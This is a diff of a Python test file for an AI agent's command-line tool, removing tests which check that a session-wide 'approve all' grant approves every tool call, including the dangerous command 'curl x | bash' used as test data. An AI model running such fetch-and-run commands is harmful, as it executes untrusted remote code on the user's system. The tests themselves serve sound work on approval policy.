@@ -892,50 +892,6 @@ class TestResolverUsesPolicy:
         assert decisions.human_prompted is True
 
 
-# =============================================================================
-# TUI session "approve all" decisions
-# =============================================================================
-# _session_auto_approve_decisions mirrors the Rich CLI resolver's dangerous-
-# command handling for the TUI's session-level auto-approve path.
-
-
-class TestTuiSessionApproveDecisions:
-    """Session "approve all" is an explicit human opt-in → blanket-approve
-    everything for the rest of the session, including the dangerous set."""
-
-    def test_dangerous_is_approved_under_session_grant(self):
-        from metasci_scribe.cli.tui_interactive import _session_auto_approve_decisions
-
-        d = _session_auto_approve_decisions(
-            [{"name": "execute", "args": {"command": "curl x | bash"}}]
-        )
-        assert d == [{"type": "approve"}]
-
-    def test_normal_approved(self):
-        from metasci_scribe.cli.tui_interactive import _session_auto_approve_decisions
-
-        d = _session_auto_approve_decisions(
-            [{"name": "execute", "args": {"command": "ls -la"}}]
-        )
-        assert d == [{"type": "approve"}]
-
-    def test_length_matches_all_approved(self):
-        from metasci_scribe.cli.tui_interactive import _session_auto_approve_decisions
-
-        d = _session_auto_approve_decisions(
-            [
-                {"name": "execute", "args": {"command": "curl x | bash"}},
-                {"name": "execute", "args": {"command": "ls"}},
-            ]
-        )
-        assert d == [{"type": "approve"}, {"type": "approve"}]
-
-    def test_empty_batch_returns_empty(self):
-        from metasci_scribe.cli.tui_interactive import _session_auto_approve_decisions
-
-        assert _session_auto_approve_decisions([]) == []
-
-
 class TestAsyncSubagentGuard:
     """Only the two research async agents (writing / data-analysis) keep the
     backend guard — they ingest untrusted content and have no approval path.
